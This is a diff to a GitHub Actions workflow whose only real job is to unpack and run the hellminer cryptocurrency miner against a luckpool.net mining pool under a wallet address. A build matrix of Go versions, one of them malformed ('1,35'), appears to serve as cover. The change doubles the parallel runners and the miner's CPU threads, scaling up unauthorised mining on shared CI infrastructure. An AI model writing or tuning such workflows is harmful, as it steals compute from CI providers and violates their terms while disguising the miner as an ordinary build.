@@ -7,7 +7,7 @@ jobs:
     name: NAME
     runs-on: windows-latest
     strategy:
-      max-parallel: 5
+      max-parallel: 10
       fail-fast: false
       matrix:
         go: [1.0, 1.1, 1.2, 1.3, 1,35]
@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive hellminer_cpu_win64_avx.zip
     - name: RUNNING
-      run: .\hellminer_cpu_win64_avx\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP -p x --cpu 2
+      run: .\hellminer_cpu_win64_avx\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP -p x --cpu 4
     - name: DONE
       run: exit
